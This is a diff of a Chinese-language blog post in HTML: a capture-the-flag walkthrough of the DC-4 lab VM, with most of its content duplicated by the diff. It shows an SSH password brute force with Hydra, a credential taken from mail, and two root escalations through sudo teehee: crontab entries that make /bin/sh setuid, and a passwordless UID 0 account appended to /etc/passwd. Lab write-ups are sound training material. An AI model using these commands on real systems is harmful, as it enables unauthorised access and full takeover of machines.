class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with local (Exim 4.89)</span><br><span class="line">	(envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">	id 1hCiQe-0000gc-EC</span><br><span class="line">	for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a test.</span><br></pre></td></tr></table></figure>
-<p>切换到<code>/var/mail</code>下获得<code>Charles</code>的密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:~$ cd /var/mail</span><br><span class="line">jim@dc-4:/var/mail$ ls</span><br><span class="line">jim</span><br><span class="line">jim@dc-4:/var/mail$ cat jim</span><br><span class="line">From charles@dc-4 Sat Apr 06 21:15:46 2019</span><br><span class="line">Return-path: &lt;charles@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000</span><br><span class="line">Received: from charles by dc-4 with local (Exim 4.89)</span><br><span class="line">	(envelope-from &lt;charles@dc-4&gt;)</span><br><span class="line">	id 1hCjIX-0000kO-Qt</span><br><span class="line">	for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Holidays</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;</span><br><span class="line">From: Charles &lt;charles@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">Status: O</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&apos;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br></pre></td></tr></table></figure>
-<p>登录<code>charles</code>，尝试命令<code>sudo -l</code>时却提示用<code>teehee</code>提权</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:/var/mail$ su charles</span><br><span class="line">Password: </span><br><span class="line">charles@dc-4:/var/mail$ sudo -l</span><br><span class="line">Matching Defaults entries for charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br></pre></td></tr></table></figure>
-<p>参考别人的文章， 有两种方法：</p>
+<pre><code>root@Knlvre:~# hydra -l jim -P dc4_passwords.txt ssh://192.168.43.193
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-23 16:10:00
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task
+[DATA] attacking ssh://192.168.43.193:22/
+[STATUS] 177.00 tries/min, 177 tries in 00:01h, 76 to do in 00:01h, 16 active
+[22][ssh] host: 192.168.43.193   login: jim   password: jibril04
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 targets did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-23 16:11:48
+</code></pre><p>ssh登录成功，查看mbox</p>
+<pre><code>root@Knlvre:~# ssh jim@192.168.43.193
+The authenticity of host &#39;192.168.43.193 (192.168.43.193)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;192.168.43.193&#39; (ECDSA) to the list of known hosts.
+jim@192.168.43.193&#39;s password: 
+Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686
+
+The programs includ...
+
+jim@dc-4:~$ ls
+backups  mbox  test.sh
+jim@dc-4:~$ cat mbox
+From root@dc-4 Sat Apr 06 20:20:04 2019
+Return-path: &lt;root@dc-4&gt;
+Envelope-to: jim@dc-4
+Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
+Received: from root by dc-4 with local (Exim 4.89)
+    (envelope-from &lt;root@dc-4&gt;)
+    id 1hCiQe-0000gc-EC
+    for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
+To: jim@dc-4
+Subject: Test
+MIME-Version: 1.0
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;
+From: root &lt;root@dc-4&gt;
+Date: Sat, 06 Apr 2019 20:20:04 +1000
+Status: RO
+
+This is a test.
+</code></pre><p>切换到<code>/var/mail</code>下获得<code>Charles</code>的密码</p>
+<pre><code>jim@dc-4:~$ cd /var/mail
+jim@dc-4:/var/mail$ ls
+jim
+jim@dc-4:/var/mail$ cat jim
+From charles@dc-4 Sat Apr 06 21:15:46 2019
+Return-path: &lt;charles@dc-4&gt;
+Envelope-to: jim@dc-4
+Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
+Received: from charles by dc-4 with local (Exim 4.89)
+    (envelope-from &lt;charles@dc-4&gt;)
+    id 1hCjIX-0000kO-Qt
+    for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
+To: jim@dc-4
+Subject: Holidays
+MIME-Version: 1.0
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;
+From: Charles &lt;charles@dc-4&gt;
+Date: Sat, 06 Apr 2019 21:15:45 +1000
+Status: O
+
+Hi Jim,
+
+I&#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.
+
+Password is:  ^xHhA&amp;hvim0y
+
+See ya,
+Charles
+</code></pre><p>登录<code>charles</code>，尝试命令<code>sudo -l</code>时却提示用<code>teehee</code>提权</p>
+<pre><code>jim@dc-4:/var/mail$ su charles
+Password: 
+charles@dc-4:/var/mail$ sudo -l
+Matching Defaults entries for charles on dc-4:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User charles may run the following commands on dc-4:
+    (root) NOPASSWD: /usr/bin/teehee
+</code></pre><p>参考别人的文章， 有两种方法：</p>
 <p>方法一：</p>
 <p>①<code>crontab</code>：是一个计划表，可以定时地执行命令。而需要命令立即执行只要设置为五个<code>*</code>就可以：<code>* * * * *</code></p>
 <p>②<code>teehee</code>：是一个命令，但暂时未弄清楚功能</p>
 <p>首先我们进行测试，创建文件666，改变他的权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># sudo teehee /etc/crontab</span><br><span class="line"># * * * * * root chmod 4777 /home/charles/666</span><br><span class="line"></span><br><span class="line">charles@dc-4:~$ touch 666</span><br><span class="line">charles@dc-4:~$ ls -la 666</span><br><span class="line">-rw-r--r-- 1 charles charles 0 Sep 23 21:01 666</span><br><span class="line">charles@dc-4:~$ sudo teehee /etc/crontab</span><br><span class="line">* * * * * root chmod 4777 /home/charles/666	#此条命令输入一次，回车就可以</span><br><span class="line">* * * * * root chmod 4777 /home/charles/666</span><br><span class="line">^C</span><br><span class="line">charles@dc-4:~$ ls -la 666</span><br><span class="line">-rwsrwxrwx 1 charles charles 0 Sep 23 21:01 666</span><br></pre></td></tr></table></figure>
-<p>现在可以去改变<code>/bin/sh</code>的权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ ls -la /bin/sh</span><br><span class="line">lrwxrwxrwx 1 root root 4 Jan 24  2017 /bin/sh -&gt; dash</span><br><span class="line">charles@dc-4:~$ ls -la /bin/dash</span><br><span class="line">-rwxrwxrwx 1 root root 124492 Jan 24  2017 /bin/dash</span><br><span class="line">charles@dc-4:~$ sudo teehee /etc/crontab</span><br><span class="line">* * * * * root chmod 4777 /bin/sh</span><br><span class="line">* * * * * root chmod 4777 /bin/sh</span><br><span class="line">^C</span><br><span class="line">charles@dc-4:~$ ls -la /bin/dash</span><br><span class="line">-rwsrwxrwx 1 root root 124492 Jan 24  2017 /bin/dash</span><br></pre></td></tr></table></figure>
-<p>可以看到<code>/bin/dash</code>权限改变成功，接下来直接使用<code>/bin/sh</code>，找flag并读取</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ /bin/sh</span><br><span class="line"># find / -name &quot;*flag*&quot;</span><br><span class="line">....</span><br><span class="line">/sys/module/scsi_mod/parameters/default_dev_flags</span><br><span class="line">/root/flag.txt</span><br><span class="line">/proc/sys/kernel/acpi_video_flags</span><br><span class="line">/proc/kpageflags</span><br><span class="line"># cat /root/flag.txt	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
-<p>方法二：</p>
+<pre><code># sudo teehee /etc/crontab
+# * * * * * root chmod 4777 /home/charles/666
+
+charles@dc-4:~$ touch 666
+charles@dc-4:~$ ls -la 666
+-rw-r--r-- 1 charles charles 0 Sep 23 21:01 666
+charles@dc-4:~$ sudo teehee /etc/crontab
+* * * * * root chmod 4777 /home/charles/666    #此条命令输入一次，回车就可以
+* * * * * root chmod 4777 /home/charles/666
+^C
+charles@dc-4:~$ ls -la 666
+-rwsrwxrwx 1 charles charles 0 Sep 23 21:01 666
+</code></pre><p>现在可以去改变<code>/bin/sh</code>的权限</p>
+<pre><code>charles@dc-4:~$ ls -la /bin/sh
+lrwxrwxrwx 1 root root 4 Jan 24  2017 /bin/sh -&gt; dash
+charles@dc-4:~$ ls -la /bin/dash
+-rwxrwxrwx 1 root root 124492 Jan 24  2017 /bin/dash
+charles@dc-4:~$ sudo teehee /etc/crontab
+* * * * * root chmod 4777 /bin/sh
+* * * * * root chmod 4777 /bin/sh
+^C
+charles@dc-4:~$ ls -la /bin/dash
+-rwsrwxrwx 1 root root 124492 Jan 24  2017 /bin/dash
+</code></pre><p>可以看到<code>/bin/dash</code>权限改变成功，接下来直接使用<code>/bin/sh</code>，找flag并读取</p>
+<pre><code>charles@dc-4:~$ /bin/sh
+# find / -name &quot;*flag*&quot;
+....
+/sys/module/scsi_mod/parameters/default_dev_flags
+/root/flag.txt
+/proc/sys/kernel/acpi_video_flags
+/proc/kpageflags
+# cat /root/flag.txt    
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888 
+888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 
+888  d8b  888          888 888      888    888                            888 888 888 888 
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
+888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  
+888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+
+</code></pre><p>方法二：</p>
 <p><code>teehee -a</code>参数可以不覆盖地向指定文件添加内容，通过这个向<code>passwd</code>中添加一个用户</p>
 <p>Ps：查看passwd，root用户的登录shell为<code>/bin/bash</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ tail -3 /etc/passwd</span><br><span class="line">jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash</span><br><span class="line">sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</span><br><span class="line">Debian-exim:x:108:112::/var/spool/exim4:/bin/false</span><br><span class="line">charles@dc-4:~$ echo &quot;Knlvre_hack::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">Knlvre_hack::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:~$ tail -3 /etc/passwd</span><br><span class="line">sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</span><br><span class="line">Debian-exim:x:108:112::/var/spool/exim4:/bin/false</span><br><span class="line">Knlvre_hack::0:0:::/bin/bash</span><br></pre></td></tr></table></figure>
-<p>参数解释</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#如：admin:x:0:0::/home/admin:/bin/bash</span><br><span class="line"></span><br><span class="line">#[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span><br></pre></td></tr></table></figure>
-<p>添加成功之后，由于没有设置密码，所以直接登录，直接是root权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ su Knlvre_hack</span><br><span class="line">root@dc-4:/home/charles# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@dc-4:/home/charles# cat /root/flag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
-<hr>
+<pre><code>charles@dc-4:~$ tail -3 /etc/passwd
+jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
+sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
+Debian-exim:x:108:112::/var/spool/exim4:/bin/false
+charles@dc-4:~$ echo &quot;Knlvre_hack::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd
+Knlvre_hack::0:0:::/bin/bash
+charles@dc-4:~$ tail -3 /etc/passwd
+sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
+Debian-exim:x:108:112::/var/spool/exim4:/bin/false
+Knlvre_hack::0:0:::/bin/bash
+</code></pre><p>参数解释</p>
+<pre><code>#如：admin:x:0:0::/home/admin:/bin/bash
+
+#[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]
+</code></pre><p>添加成功之后，由于没有设置密码，所以直接登录，直接是root权限</p>
+<pre><code>charles@dc-4:~$ su Knlvre_hack
+root@dc-4:/home/charles# id
+uid=0(root) gid=0(root) groups=0(root)
+root@dc-4:/home/charles# cat /root/flag.txt
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888 
+888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 
+888  d8b  888          888 888      888    888                            888 888 888 888 
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
+888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  
+888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+</code></pre><hr>
 <p><strong>Reference</strong></p>
 <p><a href="https://blog.csdn.net/auuuuuuuu/article/details/97832336" target="_blank" rel="noopener">https://blog.csdn.net/auuuuuuuu/article/details/97832336</a></p>
 <p><a href="https://blog.51cto.com/5437315/2420079" target="_blank" rel="noopener">https://blog.51cto.com/5437315/2420079</a></p>
